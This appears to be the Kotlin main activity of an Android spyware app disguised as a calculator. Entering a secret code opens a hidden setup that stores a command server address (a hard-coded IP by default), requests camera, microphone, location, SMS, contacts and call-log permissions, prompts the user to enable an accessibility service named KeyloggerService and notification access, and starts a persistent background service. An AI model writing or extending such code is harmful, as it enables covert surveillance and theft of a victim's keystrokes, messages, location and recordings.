package com.devicemanager

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import android.widget.EditText

class MainActivity : AppCompatActivity() {

    private lateinit var tvDisplay: TextView
    private var currentNumber = ""
    private var operator = ""
    private var firstNumber = 0.0
    private val SECRET_CODE = "123456789"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        tvDisplay = findViewById(R.id.tvDisplay)

        setupCalculator()
        checkAndStartService()
    }

    private fun setupCalculator() {
        // Number buttons
        val numberButtons = listOf(
            R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4,
            R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9
        )

        numberButtons.forEach { id ->
            findViewById<Button>(id).setOnClickListener {
                val button = it as Button
                onNumberClick(button.text.toString())
            }
        }

        // Operator buttons
        findViewById<Button>(R.id.btnPlus).setOnClickListener { onOperatorClick("+") }
        findViewById<Button>(R.id.btnMinus).setOnClickListener { onOperatorClick("-") }
        findViewById<Button>(R.id.btnMultiply).setOnClickListener { onOperatorClick("×") }
        findViewById<Button>(R.id.btnDivide).setOnClickListener { onOperatorClick("÷") }
        findViewById<Button>(R.id.btnPercent).setOnClickListener { onOperatorClick("%") }

        // Special buttons
        findViewById<Button>(R.id.btnEquals).setOnClickListener { onEqualsClick() }
        findViewById<Button>(R.id.btnC).setOnClickListener { onClearClick() }
        findViewById<Button>(R.id.btnBack).setOnClickListener { onBackClick() }
        findViewById<Button>(R.id.btnDot).setOnClickListener { onDotClick() }
    }

    private fun onNumberClick(number: String) {
        currentNumber += number
        tvDisplay.text = currentNumber

        // Check for secret code
        if (currentNumber == SECRET_CODE) {
            showActivationDialog()
            currentNumber = ""
            tvDisplay.text = "0"
        }
    }

    private fun onOperatorClick(op: String) {
        if (currentNumber.isNotEmpty()) {
            if (firstNumber != 0.0 && operator.isNotEmpty()) {
                calculate()
            }
            firstNumber = currentNumber.toDoubleOrNull() ?: 0.0
            operator = op
            currentNumber = ""
        }
    }

    private fun onEqualsClick() {
        calculate()
    }

    private fun calculate() {
        if (currentNumber.isEmpty() || operator.isEmpty()) return

        val secondNumber = currentNumber.toDoubleOrNull() ?: 0.0
        val result = when (operator) {
            "+" -> firstNumber + secondNumber
            "-" -> firstNumber - secondNumber
            "×" -> firstNumber * secondNumber
            "÷" -> if (secondNumber != 0.0) firstNumber / secondNumber else 0.0
            "%" -> firstNumber % secondNumber
            else -> 0.0
        }

        tvDisplay.text = if (result % 1.0 == 0.0) {
            result.toInt().toString()
        } else {
            String.format("%.2f", result)
        }

        currentNumber = result.toString()
        operator = ""
        firstNumber = 0.0
    }

    private fun onClearClick() {
        currentNumber = ""
        operator = ""
        firstNumber = 0.0
        tvDisplay.text = "0"
    }

    private fun onBackClick() {
        if (currentNumber.isNotEmpty()) {
            currentNumber = currentNumber.dropLast(1)
            tvDisplay.text = if (currentNumber.isEmpty()) "0" else currentNumber
        }
    }

    private fun onDotClick() {
        if (!currentNumber.contains(".")) {
            currentNumber += if (currentNumber.isEmpty()) "0." else "."
            tvDisplay.text = currentNumber
        }
    }

    private fun showActivationDialog() {
        val prefs = getSharedPreferences("device_manager", Context.MODE_PRIVATE)
        val isActivated = prefs.getBoolean("activated", false)

        if (isActivated) {
            Toast.makeText(this, "Service is already running", Toast.LENGTH_SHORT).show()
            return
        }

        val builder = AlertDialog.Builder(this)
        builder.setTitle("Activate Service")
        builder.setMessage("Do you want to activate the device management service?")

        builder.setPositiveButton("Yes") { _, _ ->
            showServerUrlDialog()
        }

        builder.setNegativeButton("No", null)
        builder.show()
    }

    private fun showServerUrlDialog() {
        val prefs = getSharedPreferences("device_manager", Context.MODE_PRIVATE)
        val savedUrl = prefs.getString("server_url", "http://65.109.188.172:3000") ?: ""

        val input = EditText(this)
        input.setText(savedUrl)
        input.hint = "Server URL"

        val builder = AlertDialog.Builder(this)
        builder.setTitle("Server Configuration")
        builder.setMessage("Enter server URL:")
        builder.setView(input)

        builder.setPositiveButton("Connect") { _, _ ->
            val url = input.text.toString().trim()
            if (url.isNotEmpty()) {
                prefs.edit()
                    .putString("server_url", url)
                    .putBoolean("activated", true)
                    .apply()

                requestPermissions()
            } else {
                Toast.makeText(this, "Please enter a valid URL", Toast.LENGTH_SHORT).show()
            }
        }

        builder.setNegativeButton("Cancel", null)
        builder.show()
    }

    private fun requestPermissions() {
        val permissions = mutableListOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
            permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
            permissions.add(Manifest.permission.READ_MEDIA_AUDIO)
        } else {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }

        val notGranted = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (notGranted.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, notGranted.toTypedArray(), 100)
        } else {
            checkSpecialPermissions()
        }
    }

    private fun checkSpecialPermissions() {
        // Check Accessibility Service
        if (!isAccessibilityServiceEnabled()) {
            showAccessibilityDialog()
            return
        }

        // Check Notification Listener
        if (!isNotificationServiceEnabled()) {
            showNotificationDialog()
            return
        }

        startDeviceService()
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val service = "${packageName}/${KeyloggerService::class.java.canonicalName}"
        val enabledServices = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        )
        return enabledServices?.contains(service) == true
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val enabledListeners = Settings.Secure.getString(
            contentResolver,
            "enabled_notification_listeners"
        )
        return enabledListeners?.contains(packageName) == true
    }

    private fun showAccessibilityDialog() {
        AlertDialog.Builder(this)
            .setTitle("Enable Accessibility Service")
            .setMessage("Please enable the accessibility service for full functionality.")
            .setPositiveButton("Open Settings") { _, _ ->
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            }
            .setNegativeButton("Skip") { _, _ ->
                checkSpecialPermissions()
            }
            .show()
    }

    private fun showNotificationDialog() {
        AlertDialog.Builder(this)
            .setTitle("Enable Notification Access")
            .setMessage("Please enable notification access for full functionality.")
            .setPositiveButton("Open Settings") { _, _ ->
                startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
            }
            .setNegativeButton("Skip") { _, _ ->
                startDeviceService()
            }
            .show()
    }

    private fun startDeviceService() {
        val intent = Intent(this, DeviceService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
        Toast.makeText(this, "Service started successfully", Toast.LENGTH_LONG).show()
    }

    private fun checkAndStartService() {
        val prefs = getSharedPreferences("device_manager", Context.MODE_PRIVATE)
        val isActivated = prefs.getBoolean("activated", false)

        if (isActivated) {
            startDeviceService()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 100) {
            checkSpecialPermissions()
        }
    }
}
